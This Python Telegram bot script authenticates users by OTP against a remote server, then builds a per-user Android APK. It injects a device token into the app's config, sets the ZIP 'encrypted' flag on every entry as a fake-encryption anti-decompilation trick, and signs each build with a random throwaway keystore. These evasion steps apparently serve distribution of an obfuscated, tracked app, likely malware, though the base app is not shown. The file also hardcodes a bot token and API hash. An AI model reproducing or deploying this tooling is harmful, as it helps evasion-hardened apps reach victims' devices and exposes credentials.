from telethon import TelegramClient, events, Button
import requests
import json
import subprocess
import os
import shutil
from pathlib import Path
import asyncio
import struct
import logging
import time

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

import sys
if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8')
    sys.stderr.reconfigure(encoding='utf-8')

API_ID = 5099517
API_HASH = '3bffbb2ff1f15e5812fbeb8ab22d0f66'
BOT_TOKEN = '7369619847:AAECDyBuAyntBsgT00JGre2jcLnXTDJUxPA'
API_BASE_URL = "http://95.134.130.160:8765"
BOT_IDENTIFIER = "Generator Apk"

USERS_FILE = Path("users.json")
APKTOOL_JAR = "apktool.jar"
BASE_APK = "app.apk"
APKSIGNER_PATH = r"C:\Users\awmeiiir\AppData\Local\Android\Sdk\build-tools\34.0.0\apksigner.bat"
ZIPALIGN_PATH = r"C:\Users\awmeiiir\AppData\Local\Android\Sdk\build-tools\34.0.0\zipalign.exe"

DEBUG_KEYSTORE_PATHS = [
    os.path.expanduser("~/.android/debug.keystore"),
    os.path.expanduser(r"~\.android\debug.keystore"),
    r"C:\Users\{}\AppData\Local\Android\.android\debug.keystore".format(os.getenv('USERNAME', 'awmeiiir')),
]
DEBUG_KEYSTORE_PASSWORD = "android"
DEBUG_KEYSTORE_ALIAS = "androiddebugkey"

class UserManager:
    def __init__(self):
        self.users = self.load_users()
        self.waiting_otp = {}
    
    def load_users(self):
        if USERS_FILE.exists():
            with open(USERS_FILE, 'r') as f:
                return json.load(f)
        return {}
    
    def save_users(self):
        with open(USERS_FILE, 'w') as f:
            json.dump(self.users, f, indent=2)
    
    def is_authenticated(self, user_id):
        return str(user_id) in self.users and self.users[str(user_id)].get('token')
    
    def get_token(self, user_id):
        return self.users.get(str(user_id), {}).get('token')
    
    def save_user(self, user_id, username, token):
        self.users[str(user_id)] = {'username': username, 'token': token}
        self.save_users()

def request_otp(username):
    try:
        response = requests.post(
            f"{API_BASE_URL}/bot/auth/request-otp",
            json={"username": username, "bot_identifier": BOT_IDENTIFIER}
        )
        if response.status_code == 200:
            return True, "OTP sent to your Telegram"
        elif response.status_code == 404:
            return False, "User not found"
        elif response.status_code == 403:
            return False, "Account disabled"
        return False, f"Error {response.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)}"

def verify_otp(username, otp_code):
    try:
        response = requests.post(
            f"{API_BASE_URL}/bot/auth/verify-otp",
            json={"username": username, "otp_code": otp_code, "bot_identifier": BOT_IDENTIFIER}
        )
        if response.status_code == 200:
            data = response.json()
            return True, data.get('service_token'), "Authentication successful!"
        elif response.status_code == 401:
            return False, None, "Invalid or expired OTP"
        elif response.status_code == 403:
            return False, None, "Account disabled"
        return False, None, f"Error {response.status_code}"
    except Exception as e:
        return False, None, f"Error: {str(e)}"

def get_device_token(service_token):
    try:
        response = requests.get(
            f"{API_BASE_URL}/bot/auth/check",
            headers={"Authorization": f"Bearer {service_token}"}
        )
        if response.status_code == 200:
            data = response.json()
            return data.get('device_token')
        return None
    except:
        return None

def modify_apk_encryption(input_apk, output_apk):
    try:
        logger.info(f"Modifying BitFlag: {input_apk}")
        
        with open(input_apk, 'rb') as f:
            data = f.read()
        
        eocd_sig = b'\x50\x4B\x05\x06'
        eocd_offset = data.rfind(eocd_sig)
        if eocd_offset == -1:
            logger.error("EOCD not found")
            return False
        
        cd_size = struct.unpack_from('<I', data, eocd_offset + 12)[0]
        cd_offset = struct.unpack_from('<I', data, eocd_offset + 16)[0]
        
        pos = cd_offset
        modified = bytearray(data)
        count = 0
        
        while pos < cd_offset + cd_size:
            if pos + 4 > len(data) or data[pos:pos+4] != b'\x50\x4B\x01\x02':
                break
            
            bitflag_offset = pos + 8
            bitflag = struct.unpack_from('<H', data, bitflag_offset)[0]
            
            if not (bitflag & 0x0001):
                bitflag |= 0x0001
                struct.pack_into('<H', modified, bitflag_offset, bitflag)
                count += 1
            
            name_len = struct.unpack_from('<H', data, pos + 28)[0]
            extra_len = struct.unpack_from('<H', data, pos + 30)[0]
            comment_len = struct.unpack_from('<H', data, pos + 32)[0]
            pos += 46 + name_len + extra_len + comment_len
        
        with open(output_apk, 'wb') as f:
            f.write(modified)
        
        logger.info(f"✅ Modified {count} entries")
        return True
        
    except Exception as e:
        logger.error(f"Error modifying BitFlag: {str(e)}")
        return False

def zipalign_apk(input_apk, output_apk):
    try:
        logger.info(f"Running zipalign: {input_apk}")
        
        if not os.path.exists(ZIPALIGN_PATH):
            logger.error(f"zipalign not found: {ZIPALIGN_PATH}")
            return False
        
        # حذف فایل خروجی اگر وجود داره
        if os.path.exists(output_apk):
            os.remove(output_apk)
        
        cmd = [
            ZIPALIGN_PATH,
            "-p",  # page align
            "-f",  # force overwrite
            "-v",  # verbose
            "4",   # alignment
            input_apk,
            output_apk
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            logger.error(f"zipalign error: {result.stderr}")
            return False
        
        if not os.path.exists(output_apk):
            logger.error(f"Zipaligned APK not created: {output_apk}")
            return False
        
        logger.info("✅ zipalign done")
        return True
        
    except Exception as e:
        logger.error(f"zipalign exception: {str(e)}")
        return False

def generate_random_string(length=10):
    import random, string
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def generate_secure_password(length=16):
    import random, string
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choice(chars) for _ in range(length))

def get_random_keystore_path():
    import random, hashlib, tempfile
    random_hash = hashlib.md5(str(random.getrandbits(128)).encode()).hexdigest()[:8]
    return os.path.join(tempfile.gettempdir(), f"custom_{random_hash}.keystore")

def create_custom_keystore():
    try:
        keystore_path = get_random_keystore_path()
        password = generate_secure_password(16)
        alias = "custom_" + generate_random_string(10)
        
        logger.info(f"Creating custom keystore: {keystore_path}")
        
        # اگه از قبل وجود داره، حذفش کن
        if os.path.exists(keystore_path):
            os.remove(keystore_path)
        
        cmd = [
            "keytool", "-genkey", "-v",
            "-keystore", keystore_path,
            "-alias", alias,
            "-keyalg", "RSA",
            "-keysize", "2048",
            "-validity", "10000",
            "-storepass", password,
            "-keypass", password,
            "-dname", f"CN={alias}, OU=Custom, O=Bot, L=Tehran, C=IR"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            logger.error(f"Keytool error: {result.stderr}")
            return None, None, None
        
        logger.info("✅ Custom keystore created")
        return keystore_path, password, alias
        
    except Exception as e:
        logger.error(f"Error creating keystore: {str(e)}")
        return None, None, None

def sign_apk(input_apk, output_apk, keystore_path, password, alias):
    try:
        logger.info(f"Signing APK: {input_apk}")
        
        if not os.path.exists(APKSIGNER_PATH):
            logger.error(f"apksigner not found: {APKSIGNER_PATH}")
            return None
        
        if not os.path.exists(input_apk):
            logger.error(f"Input APK not found: {input_apk}")
            return None
        
        if not os.path.exists(keystore_path):
            logger.error(f"Keystore not found: {keystore_path}")
            return None
        
        # حذف فایل خروجی اگه وجود داره
        if os.path.exists(output_apk):
            os.remove(output_apk)
        
        cmd = [
            APKSIGNER_PATH, "sign",
            "--ks", keystore_path,
            "--ks-pass", f"pass:{password}",
            "--ks-key-alias", alias,
            "--key-pass", f"pass:{password}",
            "--v1-signing-enabled", "true",
            "--v2-signing-enabled", "true",
            "--v3-signing-enabled", "true",
            "--v4-signing-enabled", "false",
            "--out", output_apk,
            input_apk
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            logger.error(f"Signing failed: {result.stderr}")
            return None
        
        if not os.path.exists(output_apk):
            logger.error(f"Signed APK not found: {output_apk}")
            return None
        
        logger.info(f"✅ Signed successfully")
        return output_apk
            
    except Exception as e:
        logger.error(f"Error signing: {str(e)}", exc_info=True)
        return None

def verify_apk_signature(apk_path):
    try:
        logger.info(f"Verifying signature: {apk_path}")
        
        result = subprocess.run([
            APKSIGNER_PATH, "verify",
            "--verbose",
            apk_path
        ], capture_output=True, text=True)
        
        if result.returncode == 0:
            logger.info("✅ Signature verified")
            return True
        else:
            logger.warning(f"Signature verification warning: {result.stderr}")
            return False
            
    except Exception as e:
        logger.error(f"Error verifying: {str(e)}")
        return False

async def build_apk(user_id, device_token):
    output_dir = None
    output_apk = None
    modified_apk = None
    aligned_apk = None
    signed_apk = None
    final_apk = None
    keystore_path = None
    
    try:
        logger.info(f"Starting APK build for user {user_id}")
        logger.info("=" * 60)
        logger.info("PROCESS: Decompile → Edit → Rebuild → BitFlag → Zipalign → Sign")
        logger.info("=" * 60)
        
        timestamp = int(time.time())
        output_dir = f"builds/user_{user_id}_{timestamp}"
        output_apk = f"builds/app_{user_id}_{timestamp}.apk"
        modified_apk = f"builds/app_{user_id}_{timestamp}_modified.apk"
        aligned_apk = f"builds/app_{user_id}_{timestamp}_aligned.apk"
        final_apk = f"builds/app_{user_id}_{timestamp}_final.apk"
        
        os.makedirs('builds', exist_ok=True)
        await asyncio.to_thread(cleanup_old_builds, user_id)
        
        # STEP 1: Decompile
        logger.info("STEP 1: Decompiling...")
        process = await asyncio.create_subprocess_exec(
            'java', '-jar', APKTOOL_JAR,
            'd', BASE_APK,
            '-o', output_dir,
            '-f', '-s',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        
        if process.returncode != 0:
            logger.error(f"Decompile failed: {stderr.decode()}")
            return False, f"Decompile failed"
        
        logger.info("✅ Decompile done")
        
        # STEP 2: Edit config.json
        logger.info("STEP 2: Editing config.json...")
        config_file = f'{output_dir}/assets/config.json'
        
        if not await asyncio.to_thread(os.path.exists, config_file):
            logger.error(f"config.json not found: {config_file}")
            return False, "config.json not found"
        
        config_content = await asyncio.to_thread(read_file, config_file)
        
        try:
            config_data = json.loads(config_content)
            logger.info(f"Original user_id: {config_data.get('user_id')}")
            
            config_data['user_id'] = device_token
            logger.info(f"New user_id: {device_token}")
            
            new_config_content = json.dumps(config_data, indent=2, ensure_ascii=False)
            await asyncio.to_thread(write_file, config_file, new_config_content)
            logger.info("✅ config.json updated")
            
        except json.JSONDecodeError as e:
            logger.error(f"JSON error: {str(e)}")
            return False, f"Invalid JSON: {str(e)}"
        
        # STEP 3: Rebuild
        logger.info("STEP 3: Rebuilding...")
        process = await asyncio.create_subprocess_exec(
            'java', '-jar', APKTOOL_JAR,
            'b', output_dir,
            '-o', output_apk,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        
        if process.returncode != 0:
            logger.error(f"Rebuild failed: {stderr.decode()}")
            return False, f"Rebuild failed"
        
        logger.info("✅ Rebuild done")
        
        if not await asyncio.to_thread(os.path.exists, output_apk):
            logger.error(f"APK not found: {output_apk}")
            return False, "APK not created"
        
        # STEP 4: BitFlag
        logger.info("STEP 4: Modifying BitFlag...")
        if not await asyncio.to_thread(modify_apk_encryption, output_apk, modified_apk):
            logger.error("BitFlag failed")
            return False, "BitFlag modification failed"
        
        logger.info("✅ BitFlag done")
        
        # STEP 5: Zipalign (قبل از sign)
        logger.info("STEP 5: Running zipalign (pre-sign)...")
        if not await asyncio.to_thread(zipalign_apk, modified_apk, aligned_apk):
            logger.error("zipalign failed")
            return False, "zipalign failed"
        
        if not await asyncio.to_thread(os.path.exists, aligned_apk):
            logger.error(f"Aligned APK not found: {aligned_apk}")
            return False, "Aligned APK not created"
        
        logger.info("✅ zipalign done (pre-sign)")
        
        # STEP 6: Create custom keystore
        logger.info("STEP 6: Creating custom keystore...")
        keystore_result = await asyncio.to_thread(create_custom_keystore)
        
        if keystore_result[0] is None:
            logger.error("Custom keystore creation failed")
            return False, "Failed to create custom keystore"
        
        keystore_path, password, alias = keystore_result
        logger.info(f"✅ Custom keystore ready: {os.path.basename(keystore_path)}")
        
        # STEP 7: Sign APK (آخرین مرحله!)
        logger.info("STEP 7: Signing APK...")
        sign_result = await asyncio.to_thread(sign_apk, aligned_apk, final_apk, keystore_path, password, alias)
        
        if sign_result is None:
            logger.error("Signing failed")
            return False, "Signing failed"
        
        if not await asyncio.to_thread(os.path.exists, final_apk):
            logger.error(f"Signed APK not found: {final_apk}")
            return False, "Signed APK not created"
        
        logger.info("✅ Signing done")
        
        # STEP 8: Verify
        logger.info("STEP 8: Verifying signature...")
        is_verified = await asyncio.to_thread(verify_apk_signature, final_apk)
        
        if not is_verified:
            logger.warning("Verification warning (but APK should still work)")
        else:
            logger.info("✅ Verification passed")
        
        logger.info(f"✅ FINAL APK: {final_apk}")
        logger.info("=" * 60)
        
        return True, final_apk
        
    except Exception as e:
        logger.error(f"Build error: {str(e)}", exc_info=True)
        return False, f"Error: {str(e)}"
    
    finally:
        logger.info("Cleaning up temp files...")
        
        # پاک کردن فایل‌های موقت
        temp_files = [output_dir, output_apk, modified_apk, aligned_apk]
        
        for temp_file in temp_files:
            if temp_file and await asyncio.to_thread(os.path.exists, temp_file):
                try:
                    if os.path.isdir(temp_file):
                        await asyncio.to_thread(shutil.rmtree, temp_file)
                    else:
                        await asyncio.to_thread(os.remove, temp_file)
                    logger.info(f"Removed: {temp_file}")
                except Exception as e:
                    logger.warning(f"Could not remove {temp_file}: {e}")
        
        # پاک کردن keystore
        if keystore_path and await asyncio.to_thread(os.path.exists, keystore_path):
            try:
                await asyncio.to_thread(os.remove, keystore_path)
                logger.info(f"Removed keystore: {keystore_path}")
            except Exception as e:
                logger.warning(f"Could not remove keystore: {e}")

def read_file(path):
    with open(path, 'r', encoding='utf-8') as f:
        return f.read()

def write_file(path, content):
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)

def cleanup_old_builds(user_id):
    if not os.path.exists('builds'):
        return
    
    for file in os.listdir('builds'):
        if file.startswith(f'user_{user_id}_') or file.startswith(f'app_{user_id}_'):
            path = os.path.join('builds', file)
            try:
                if os.path.isdir(path):
                    shutil.rmtree(path)
                else:
                    os.remove(path)
                logger.info(f"Cleaned: {path}")
            except Exception as e:
                logger.error(f"Cleanup error {path}: {str(e)}")

def cleanup_session():
    session_files = ['bot_session.session', 'bot_session.session-journal']
    for session_file in session_files:
        if os.path.exists(session_file):
            try:
                os.remove(session_file)
                logger.info(f"Removed: {session_file}")
            except Exception as e:
                logger.error(f"Could not remove {session_file}: {str(e)}")

cleanup_session()

user_manager = UserManager()
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.message.message.strip()
    
    if text == '/start':
        if user_manager.is_authenticated(user_id):
            await event.reply(
                "**Welcome back!**\n\nYou're already authenticated.",
                buttons=[[Button.inline("🔨 Build APK", data="build")]]
            )
        else:
            await event.reply(
                "**Welcome to APK Builder Bot!**\n\n📝 Send your username to get started:"
            )
        return
    
    if user_manager.is_authenticated(user_id):
        await event.reply(
            "**You're already authenticated**",
            buttons=[[Button.inline("🔨 Build APK", data="build")]]
        )
        return
    
    if user_id in user_manager.waiting_otp:
        username = user_manager.waiting_otp[user_id]
        
        if text.isdigit() and len(text) == 6:
            await event.reply("⏳ Verifying OTP...")
            success, token, msg = verify_otp(username, text)
            
            if success:
                user_manager.save_user(user_id, username, token)
                del user_manager.waiting_otp[user_id]
                await event.reply(
                    f"**✅ {msg}**\n\nToken saved successfully!",
                    buttons=[[Button.inline("🔨 Build APK", data="build")]]
                )
            else:
                await event.reply(f"❌ {msg}\n\n📝 Send username again:")
                del user_manager.waiting_otp[user_id]
        else:
            await event.reply("❌ Invalid OTP\n\nPlease enter a valid 6-digit OTP code")
    else:
        username = text
        await event.reply("⏳ Requesting OTP...")
        success, msg = request_otp(username)
        
        if success:
            user_manager.waiting_otp[user_id] = username
            await event.reply(
                f"**📨 {msg}**\n\n"
                f"Check your Telegram for the OTP code\n"
                f"⏰ Code expires in 5 minutes\n\n"
                f"Enter your 6-digit OTP:"
            )
        else:
            await event.reply(f"❌ {msg}\n\nPlease try again:")

@bot.on(events.CallbackQuery(data="build"))
async def build_handler(event):
    user_id = event.sender_id
    apk_file = None
    
    try:
        if not user_manager.is_authenticated(user_id):
            await event.answer("❌ Not authenticated", alert=True)
            return
        
        await event.edit(
            "**🔨 Building APK...**\n\n"
            "⏳ Please wait 1-2 minutes\n\n"
            "📋 Steps:\n"
            "1️⃣ Decompiling\n"
            "2️⃣ Editing config\n"
            "3️⃣ Rebuilding\n"
            "4️⃣ BitFlag modification\n"
            "5️⃣ Zipaligning\n"
            "6️⃣ Creating keystore\n"
            "7️⃣ Signing (final step)"
        )
        
        service_token = user_manager.get_token(user_id)
        device_token = get_device_token(service_token)
        
        if not device_token:
            await event.edit("❌ Failed to get device token")
            return
        
        logger.info(f"Building for user {user_id} with token {device_token}")
        
        success, result = await build_apk(user_id, device_token)
        
        if success:
            apk_file = result
            
            await event.edit("**📤 Uploading APK...**")
            
            await bot.send_file(
                event.chat_id,
                apk_file,
                caption=(
                    "**✅ APK Built Successfully!**\n\n"
                    f"🔑 Device Token: `{device_token}`\n\n"
                    f"🔐 Signed with custom keystore (v1+v2+v3)\n"
                    f"✨ Properly zipaligned\n\n"
                    f"📱 Ready to install!"
                ),
                buttons=[[Button.inline("🔨 Build Again", data="build")]]
            )
            
            await event.delete()
            
        else:
            logger.error(f"Build failed for user {user_id}: {result}")
            await event.edit(
                f"**❌ Build Failed**\n\n{result}",
                buttons=[[Button.inline("🔄 Try Again", data="build")]]
            )
    
    except Exception as e:
        logger.error(f"Handler error: {str(e)}", exc_info=True)
        await event.edit(
            f"**❌ Error**\n\n{str(e)}",
            buttons=[[Button.inline("🔄 Try Again", data="build")]]
        )
    
    finally:
        if apk_file and await asyncio.to_thread(os.path.exists, apk_file):
            try:
                await asyncio.to_thread(os.remove, apk_file)
                logger.info(f"Cleaned final APK: {apk_file}")
            except Exception as e:
                logger.warning(f"Could not remove final APK: {e}")

print("=" * 70)
print("🤖 APK Builder Bot - Professional Edition")
print("=" * 70)
logger.info("Bot started and ready!")
bot.run_until_disconnected()